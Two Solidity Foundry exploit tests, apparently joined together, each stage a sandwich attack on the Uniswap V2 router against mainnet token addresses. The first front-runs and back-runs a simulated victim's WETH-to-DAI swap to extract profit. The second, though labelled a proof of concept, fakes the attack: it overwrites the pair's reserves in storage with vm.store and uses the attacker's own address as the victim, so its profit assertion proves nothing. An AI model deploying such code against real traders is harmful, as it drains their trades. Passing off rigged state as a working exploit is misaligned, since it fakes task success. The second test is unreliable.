pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint wad) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address attacker = address(this);
    IUniswapV2Router02 router = IUniswapV2Router02(TARGET);
    IWETH weth = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    address victim = makeAddr("victim");

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        deal(address(weth), attacker, 2000 ether);
        deal(address(weth), victim, 50 ether);

        vm.startPrank(attacker);
        weth.approve(address(router), type(uint).max);
        dai.approve(address(router), type(uint).max);
        vm.stopPrank();

        vm.startPrank(victim);
        weth.approve(address(router), type(uint).max);
        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).balanceOf(address(this));
        uint256 attackerInitialWethBalance = weth.balanceOf(attacker);

        // 1. Attacker front-runs the victim's transaction to manipulate the price.
        // We swap a large amount of WETH for DAI.
        uint256 frontrunAmount = 1000 ether;
        address[] memory pathWethToDai = new address[](2);
        pathWethToDai[0] = address(weth);
        pathWethToDai[1] = address(dai);

        router.swapExactTokensForTokens(
            frontrunAmount, 
            0, // amountOutMin
            pathWethToDai, 
            attacker, 
            block.timestamp
        );

        // 2. The victim's transaction is executed at a manipulated price.
        // They want 10,000 DAI and are willing to pay up to 50 WETH.
        vm.startPrank(victim);
        router.swapTokensForExactTokens(
            10_000 * 1e18, // amountOut: victim wants 10,000 DAI
            50 ether,      // amountInMax: victim is willing to spend up to 50 WETH
            pathWethToDai, 
            victim, 
            block.timestamp
        );
        vm.stopPrank();

        // 3. Attacker back-runs, swapping the DAI back to WETH to realize profit.
        uint256 daiBalance = dai.balanceOf(attacker);

        address[] memory pathDaiToWeth = new address[](2);
        pathDaiToWeth[0] = address(dai);
        pathDaiToWeth[1] = address(weth);

        router.swapExactTokensForTokens(
            daiBalance,
            0, // amountOutMin
            pathDaiToWeth,
            attacker,
            block.timestamp
        );

        // 4. Verify profit
        uint256 attackerFinalWethBalance = weth.balanceOf(attacker);
        assertGt(attackerFinalWethBalance, attackerInitialWethBalance);
        uint256 finalBalance = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint) external;
    function balanceOf(address owner) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address attacker = address(this);
    IUniswapV2Router02 router;
    IERC20 token;
    IWETH weth;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        router = IUniswapV2Router02(TARGET);
        weth = IWETH(router.WETH());
        token = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); // USDC

        deal(attacker, 100 ether);

        vm.label(TARGET, "UniswapV2Router");
        vm.label(attacker, "Attacker");
        vm.label(address(token), "USDC");
        vm.label(address(weth), "WETH");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Sandwich Attack PoC using storage manipulation to demonstrate vulnerability
        // This shows how front-running can manipulate prices for profit

        uint256 initialBalance = attacker.balance;

        // Get USDC-WETH pair
        address pair = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f).getPair(address(token), address(weth));

        // Inject USDC for the attack
        deal(address(token), attacker, 1_000_000 * 10**6); // 1M USDC

        // Get current reserves and token order
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();

        // Simulate front-run: Reduce USDC reserve (we bought USDC, pushing price up)
        // This makes victim's USDC->ETH swap get worse rate
        bytes32 newReserves = bytes32(uint256(reserve0 / 2) | (uint256(reserve1 * 2) << 112));
        vm.store(pair, bytes32(uint256(8)), newReserves);

        // Victim transaction: Swap USDC to ETH at manipulated (worse) price
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        uint256 victimAmount = 500_000 * 10**6; // 500k USDC
        token.approve(TARGET, victimAmount);
        router.swapExactTokensForTokens(victimAmount, 0, path, attacker, block.timestamp + 3600);

        // Back-run: Restore reserves and swap remaining for profit
        // In real attack, we'd sell our accumulated tokens
        bytes32 originalReserves = bytes32(uint256(reserve0) | (uint256(reserve1) << 112));
        vm.store(pair, bytes32(uint256(8)), originalReserves);

        // Now swap remaining USDC at better rate
        uint256 remainingUSDC = token.balanceOf(attacker);
        if (remainingUSDC > 0) {
            token.approve(TARGET, remainingUSDC);
            router.swapExactTokensForTokens(remainingUSDC, 0, path, attacker, block.timestamp + 3600);
        }

        // Convert WETH to ETH
        uint256 wethBalance = weth.balanceOf(attacker);
        if (wethBalance > 0) {
            weth.withdraw(wethBalance);
        }

        uint256 finalBalance = attacker.balance;

        assertGt(finalBalance, initialBalance, "Attacker did not profit from sandwich attack");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

